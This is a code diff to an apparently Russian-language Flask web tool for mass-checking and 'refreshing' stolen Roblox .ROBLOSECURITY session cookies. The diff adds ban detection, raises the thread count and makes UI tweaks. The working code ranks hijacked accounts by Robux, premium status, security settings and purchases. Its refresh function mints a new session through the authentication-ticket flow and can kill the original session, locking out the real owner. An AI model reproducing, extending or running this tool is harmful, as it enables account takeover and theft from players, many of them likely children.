@@ -35,13 +35,28 @@ def save_history(fp, data):
 
 def add_checker_history(entry):
     h = load_history(CHECKER_HISTORY_FILE)
-    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'type': entry.get('type','single'), 'total': entry.get('total',1), 'valid': entry.get('valid',0), 'cookies': entry.get('cookies',[])[:30], 'download_url': entry.get('download_url',''), 'full_data': entry.get('full_data', [])[:50]})
+    h.append({
+        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
+        'type': entry.get('type','single'),
+        'total': entry.get('total',1),
+        'valid': entry.get('valid',0),
+        'cookies': entry.get('cookies',[])[:30],
+        'download_url': entry.get('download_url',''),
+        'full_data': entry.get('full_data', [])[:50]
+    })
     if len(h) > 50: h = h[-50:]
     save_history(CHECKER_HISTORY_FILE, h)
 
 def add_fresher_history(entry):
     h = load_history(FRESHER_HISTORY_FILE)
-    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mode': entry.get('mode','duplicate'), 'refreshed_count': entry.get('refreshed_count',0), 'success_count': entry.get('success_count',0), 'fail_count': entry.get('fail_count',0), 'cookies': entry.get('cookies',[])[:20]})
+    h.append({
+        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
+        'mode': entry.get('mode','duplicate'),
+        'refreshed_count': entry.get('refreshed_count',0),
+        'success_count': entry.get('success_count',0),
+        'fail_count': entry.get('fail_count',0),
+        'cookies': entry.get('cookies',[])[:20]
+    })
     if len(h) > 50: h = h[-50:]
     save_history(FRESHER_HISTORY_FILE, h)
 
@@ -59,44 +74,65 @@ def extract_cookies_from_text(text):
     seen = set()
     unique = []
     for c in cookies:
-        if c not in seen: seen.add(c); unique.append(c)
+        if c not in seen: 
+            seen.add(c)
+            unique.append(c)
     return unique
 
 def get_full_info(cookie):
-    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
+    info = {
+        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'Created':'?', 
+        'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False, 'AccountPinEnabled':False, 
+        'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ', 'IsBanned': False, 'RAP': 0, 
+        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0, 'IsPremium':False, 'DonationTotal':0
+    }
     try:
         c = cookie.strip()
         if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
         s = requests.Session()
         s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
+        
         r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
         if r.status_code != 200: return info
         d = r.json()
         if 'id' not in d: return info
-        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
+        
+        info['UserID'] = d.get('id')
+        info['Username'] = d.get('name')
+        info['status'] = '✅'
         uid = info['UserID']
+        
         def g(url):
             try:
                 r = s.get(url, verify=False, timeout=10)
                 return r.json() if r.status_code == 200 else {}
             except: return {}
+
         sd = g('https://www.roblox.com/my/settings/json')
         if sd:
             sec = sd.get('MyAccountSecurityModel',{})
-            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
-            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
+            info['EmailSet'] = sec.get('IsEmailSet',False)
+            info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
+            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False)
+            info['PhoneSet'] = sec.get('IsPhoneSet',False)
+            
         pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
         if pm and pm.get('isSubscribed'): info['IsPremium'] = True
+        
         rd = g(f'https://users.roblox.com/v1/users/{uid}')
         if rd:
+            info['IsBanned'] = rd.get('isBanned', False)
             try:
                 dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                 info['Created'] = dt.strftime('%d.%m.%Y')
             except: pass
+            
         rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
         if rb: info['Robux'] = rb.get('robux',0)
+        
         ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
         if ct: info['Country'] = ct.get('countryCode','?')
+        
         try:
             total = 0; gp_dict = {}; cursor = ""; page = 0
             while page < 5:
@@ -117,6 +153,7 @@ def get_full_info(cookie):
                 page += 1; time.sleep(0.1)
             info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
         except: pass
+        
         sc = 0
         if info['EmailSet']: sc += 1
         if info['TwoFactorEnabled']: sc += 2
@@ -127,7 +164,10 @@ def get_full_info(cookie):
     return info
 
 def quick_validate(cookie):
-    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
+    result = {
+        'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,
+        'is_premium':False,'has_email':False,'has_2fa':False,'is_banned': False, 'cookie':cookie,'score':0
+    }
     try:
         c = cookie.strip()
         if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
@@ -139,29 +179,38 @@ def quick_validate(cookie):
             if 'id' in d:
                 result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
                 uid = result['user_id']
+                
                 try:
                     rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                     if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
                 except: pass
+                
                 try:
                     rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                     if rd.status_code == 200:
-                        cr = rd.json().get('created','')
+                        rdata = rd.json()
+                        result['is_banned'] = rdata.get('isBanned', False)
+                        cr = rdata.get('created','')
                         if cr:
                             result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
                             result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
                 except: pass
+                
                 try:
                     pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                     if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
                 except: pass
+                
                 try:
                     st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                     if st.status_code == 200:
                         sec = st.json().get('MyAccountSecurityModel',{})
-                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
+                        result['has_email'] = sec.get('IsEmailSet',False)
+                        result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
                 except: pass
+                
                 score = 0
+                if result['is_banned']: score -= 500
                 if result['robux'] >= 10000: score += 100
                 elif result['robux'] >= 1000: score += 50
                 elif result['robux'] >= 100: score += 25
@@ -178,15 +227,15 @@ def quick_validate(cookie):
     return result
 
 def mass_check(cookies_list):
-    if not cookies_list:
-        return []
+    if not cookies_list: return []
     results = []
-    with ThreadPoolExecutor(max_workers=10) as ex:
+    with ThreadPoolExecutor(max_workers=15) as ex:
         futures = {ex.submit(quick_validate, c): c for c in cookies_list}
         for f in as_completed(futures):
             try: results.append(f.result())
-            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
-    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
+            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False, 'is_banned': False})
+    valid = [r for r in results if r['status']=='✅']
+    invalid = [r for r in results if r['status']=='❌']
     valid.sort(key=lambda x: x['score'], reverse=True)
     return valid + invalid
 
@@ -203,17 +252,21 @@ def refresh_roblox_cookie(cookie, kill_old=False):
             result['error'] = "Кука невалидна"; return result
         user_data = check_r.json()
         result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
+        
         csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
         csrf_token = csrf_r.headers.get('x-csrf-token')
         if not csrf_token:
             result['error'] = "CSRF token not found"; return result
-        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
+            
+        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
         ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
         auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
         if not auth_ticket:
             result['error'] = "Auth ticket not found"; return result
+            
         redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
         redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
+        
         new_cookie_value = None
         set_cookie = redeem_r.headers.get('Set-Cookie', '')
         if '.ROBLOSECURITY=' in set_cookie:
@@ -224,11 +277,13 @@ def refresh_roblox_cookie(cookie, kill_old=False):
                 if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
         if not new_cookie_value:
             result['error'] = "New cookie not found"; return result
+            
         if kill_old:
             try:
                 break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                 requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
             except: pass
+            
         test_s = requests.Session()
         test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
         test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
@@ -243,7 +298,8 @@ def refresh_roblox_cookie(cookie, kill_old=False):
 def format_full_report(info):
     if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
     gp = info.get('PurchasedGamepasses',{})
-    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
+    ban_status = "🚫 ЗАБАНЕН" if info.get('IsBanned') else "🟢 АКТИВЕН"
+    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']} | Статус: {ban_status}\n"
     r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
     r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
     r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
@@ -259,6 +315,7 @@ def format_quick_report(result):
         score = result.get('score',0)
         rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
         badges = []
+        if result.get('is_banned'): badges.append("🚫BAN")
         if result.get('is_premium'): badges.append("💠")
         if result.get('has_2fa'): badges.append("🔐")
         return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"
@@ -274,8 +331,7 @@ def merge_cookie_files(contents):
 
 def split_cookies_by_count(content, count):
     cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
-    if not cookies or count <= 0:
-        return []
+    if not cookies or count <= 0: return []
     files = []
     for i in range(0, len(cookies), count):
         files.append('\n'.join(cookies[i:i+count]))
@@ -283,10 +339,8 @@ def split_cookies_by_count(content, count):
 
 def split_cookies_by_files(content, num):
     cookies = [l.strip() for l in content.split('\n') if len(l) > 20]
-    if not cookies or num <= 0:
-        return []
-    if num > len(cookies):
-        num = len(cookies)
+    if not cookies or num <= 0: return []
+    if num > len(cookies): num = len(cookies)
     per = len(cookies) // num
     rem = len(cookies) % num
     files = []
@@ -352,14 +406,15 @@ HTML = r"""<!DOCTYPE html>
         .logo{font-size:30px;font-weight:900;font-style:italic;background:linear-gradient(135deg,#c084fc,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
         .header-right{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
         .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:24px}
-        .tab{padding:8px 18px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s}
+        .tab{padding:8px 18px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s;user-select:none;}
         .tab:hover{border-color:var(--accent);color:var(--text)}
         .tab.active{border-color:#c084fc;background:rgba(168,85,247,0.3);color:#c084fc}
         .tab-content{display:none}
         .tab-content.active{display:block}
         .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:22px 24px;margin-bottom:20px;color:var(--text)}
         .card h2{font-size:18px;color:var(--text);margin-bottom:14px;font-weight:700}
-        .btn{padding:10px 22px;border:none;border-radius:30px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;gap:6px;text-decoration:none;transition:all 0.2s}
+        .btn{padding:10px 22px;border:none;border-radius:30px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;justify-content:center;gap:6px;text-decoration:none;transition:all 0.2s;user-select:none;}
+        .btn:active{transform:scale(0.98);}
         .btn-primary{background:linear-gradient(135deg,#a855f7,#d946ef)}
         .btn-success{background:linear-gradient(135deg,#10b981,#059669)}
         .btn-secondary{background:rgba(255,255,255,0.06);border:1px solid var(--border);color:var(--text2)}
@@ -397,7 +452,7 @@ HTML = r"""<!DOCTYPE html>
         .gap-12{display:flex;gap:12px;flex-wrap:wrap}
         .checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
         @media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
-        .theme-btn{background:var(--input);border:1px solid var(--border);border-radius:20px;padding:6px 12px;cursor:pointer;font-size:16px;color:var(--text)}
+        .theme-btn{background:var(--input);border:1px solid var(--border);border-radius:20px;padding:6px 12px;cursor:pointer;font-size:16px;color:var(--text);user-select:none;}
         .filter-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
         .filter-chip{padding:4px 10px;border-radius:14px;font-size:11px;cursor:pointer;background:var(--input);border:1px solid var(--border);color:var(--text2);transition:all 0.2s;user-select:none}
         .filter-chip.active{background:rgba(168,85,247,0.3);border-color:var(--accent);color:var(--accent)}
@@ -411,7 +466,7 @@ HTML = r"""<!DOCTYPE html>
         <div class="header-right">
             <span id="logStats" style="color:var(--text2);font-size:11px;"></span>
             <span id="sessionTimer" style="color:#00b894;font-family:monospace;font-size:12px;">⏱️ 00:00:00</span>
-            <button class="theme-btn" onclick="toggleTheme()" title="Сменить тему">🌓</button>
+            <button class="theme-btn" id="themeBtn" onclick="toggleTheme()" title="Сменить тему">🌓</button>
             <span style="color:var(--text2);font-size:12px;">⚡ PRO</span>
         </div>
     </div>
@@ -526,7 +581,8 @@ function toggleTheme() {
 })();
 
 document.querySelectorAll('.tab').forEach(function(tab) {
-    tab.addEventListener('click', function() {
+    tab.addEventListener('click', function(e) {
+        e.preventDefault();
         var tabId = this.getAttribute('data-tab');
         document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
         document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
@@ -547,10 +603,10 @@ function setupDragDrop(areaId, fileInputId) {
     var area = document.getElementById(areaId);
     if (!area) return;
     ['dragenter', 'dragover'].forEach(function(evt) {
-        area.addEventListener(evt, function(e) { e.preventDefault(); area.classList.add('drag-over'); });
+        area.addEventListener(evt, function(e) { e.preventDefault(); e.stopPropagation(); area.classList.add('drag-over'); });
     });
     ['dragleave', 'drop'].forEach(function(evt) {
-        area.addEventListener(evt, function(e) { e.preventDefault(); area.classList.remove('drag-over'); });
+        area.addEventListener(evt, function(e) { e.preventDefault(); e.stopPropagation(); area.classList.remove('drag-over'); });
     });
     area.addEventListener('drop', function(e) {
         var files = e.dataTransfer.files;
@@ -599,16 +655,6 @@ document.getElementById('massFile').addEventListener('change', function(e) {
     }
 });
 
-document.getElementById('mergeFiles').addEventListener('change', function(e) {
-    var list = document.getElementById('mergeFileList'); list.innerHTML = '';
-    if (this.files) {
-        Array.from(this.files).forEach(function(f, i) {
-            var div = document.createElement('div'); div.className = 'file-item';
-            div.textContent = (i+1) + '. ' + f.name; list.appendChild(div);
-        });
-    }
-});
-
 document.getElementById('splitCountFile').addEventListener('change', function(e) {
     if (this.files && this.files[0]) {
         var reader = new FileReader();
@@ -650,7 +696,7 @@ async function runMassCheck() {
     
     resBox.textContent = '⏳ Извлечение и проверка...';
     progress.style.width = '10%';
-    logBox.innerHTML = '<div class="log-line">🔄 Запуск многопоточной проверки (10 потоков)...</div>';
+    logBox.innerHTML = '<div class="log-line">🔄 Запуск многопоточной проверки (15 потоков)...</div>';
     
     try {
         var fd = new FormData(); fd.append('file', new Blob([window.massFileContent]));
@@ -667,7 +713,6 @@ async function runMassCheck() {
         
         if (d.success) {
             window.massResultsData = d.full_data || [];
-            
             document.getElementById('filterBar').style.display = 'flex';
             document.getElementById('massActions').style.display = 'flex';
             
@@ -706,7 +751,8 @@ function applyFilter(type, element) {
     filtered.forEach(function(r) {
         var score = r.score || 0;
         var rank = score>=150 ? "👑" : (score>=100 ? "💎" : (score>=60 ? "⭐" : (score>=30 ? "🟢" : "🔹")));
-        html += rank + ' ' + r.username + ' [' + r.user_id + '] | ⏣' + (r.robux||0).toLocaleString() + ' | ' + (r.created||'?') + '\n';
+        var banMark = r.is_banned ? " [🚫 BANNED]" : "";
+        html += rank + ' ' + r.username + ' [' + r.user_id + ']' + banMark + ' | ⏣' + (r.robux||0).toLocaleString() + ' | ' + (r.created||'?') + '\n';
     });
     
     document.getElementById('massResult').textContent = html || 'Нет результатов';
@@ -930,7 +976,7 @@ def api_mass_check():
             'status': '✅', 'username': r['username'], 'user_id': r['user_id'],
             'robux': r['robux'], 'created': r['created'], 'score': r['score'],
             'is_premium': r.get('is_premium', False), 'has_2fa': r.get('has_2fa', False),
-            'has_email': r.get('has_email', False), 'cookie': r['cookie']
+            'has_email': r.get('has_email', False), 'is_banned': r.get('is_banned', False), 'cookie': r['cookie']
         })
     for r in invalid:
         full_data.append({'status': '❌', 'cookie': r['cookie'], 'score': -1})
